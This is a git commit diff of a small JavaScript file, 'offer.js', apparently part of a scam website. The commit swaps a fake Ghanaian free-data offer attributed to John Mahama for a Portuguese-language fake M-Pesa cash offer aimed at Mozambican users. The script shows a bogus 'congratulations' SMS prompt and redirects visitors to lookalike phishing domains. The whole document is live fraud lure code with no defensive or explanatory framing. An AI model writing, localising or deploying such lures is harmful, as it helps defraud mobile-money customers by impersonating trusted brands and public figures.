996e48ee778db7c7d04209de2a92dc33dc1ea8e5
codexken <inyeneawakessien@gmail.com>
2024-09-30 12:25:51 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'ACEITA MZN2500'
+password=prompt('SMS: Parabéns Está entre os clientes M-Pesa que vão receber a oferta MZN2500, Por favor, pressione OK para levantar dinheiro agora ','ACEITA MZN2500');
+if (password != 'ACEITA MZN2500') {
+location.href='https://mpesa-mz.programs.lat/ofertas';
 }
